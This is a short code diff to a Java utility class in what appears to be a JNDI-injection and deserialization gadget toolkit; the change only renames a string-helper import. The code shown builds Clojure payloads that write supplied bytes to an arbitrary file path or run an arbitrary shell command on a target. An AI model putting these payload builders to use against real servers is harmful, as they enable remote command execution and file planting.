@@ -1,6 +1,6 @@
 package com.qi4l.jndi.gadgets.utils.clojure;
 
-import com.qi4l.jndi.gadgets.utils.Strings;
+import com.qi4l.jndi.gadgets.utils.StringUtil;
 import com.qi4l.jndi.gadgets.utils.Utils;
 
 import java.util.Arrays;
@@ -18,7 +18,7 @@ public class ClojureUtil {
             String[] strings = Utils.handlerCommand(command);
             return "(def path (new String \"" + strings[0] + "\"))\n(def out (new java.io.FileOutputStream path))\n(def byts (.getObject \"" + strings[1] + "\"))\n(.write out byts)";
         }
-        String cmd = Strings.join(Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\").split(" ")), " ", "\"", "\"");
+        String cmd = StringUtil.join(Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\").split(" ")), " ", "\"", "\"");
         return String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)(println \"QI4L\")", new Object[]{cmd});
     }
 
